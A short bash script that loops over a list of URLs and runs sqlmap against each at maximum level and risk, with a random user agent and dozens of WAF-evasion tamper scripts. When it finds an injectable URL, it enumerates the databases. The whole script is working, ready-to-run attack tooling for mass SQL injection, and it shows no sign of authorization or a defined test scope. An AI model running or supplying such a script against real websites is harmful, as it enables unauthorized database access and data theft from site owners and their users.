#!/bin/bash

# Define the link file path
LINKS_FILE="sqlisqli.txt"

# Checks if the file exists
if [ ! -f "$LINKS_FILE" ]; then
    echo "files $LINKS_FILE Does not exist, please check the path!"
    exit 1
fi

# Iterate over the links in the file
while IFS= read -r url
  do
    echo "Testing: $url"

    # Use sqlmap to test the link for vulnerabilities
    #python3.10 /root/sqlmap/sqlmap.py -u "$url" --batch --level=3 --risk=3 --random-agent --tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,overlongutf8,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor" > output.log 2>&1
    sqlmap -u "$url" --batch --level=3 --risk=3 --random-agent --tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,overlongutf8,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor" > output.log 2>&1

    # Check if the vulnerability was found
    if grep -q "is vulnerable" output.log; then
        echo "Discover the bug! Pause and list databases..."

        # Execute sqlmap --dbs to get the database information
        #python3.10 /root/sqlmap/sqlmap.py -u "$url" --dbs --batch --random-agent
        sqlmap -u "$url" --dbs --batch --random-agent

        # End the loop or prompt the next step as needed
        break
    else
        echo "No bug found, keep testing..."
    fi

    # Cleaning up log files
    rm -f output.log

done < "$LINKS_FILE"

echo "All link tests completed."
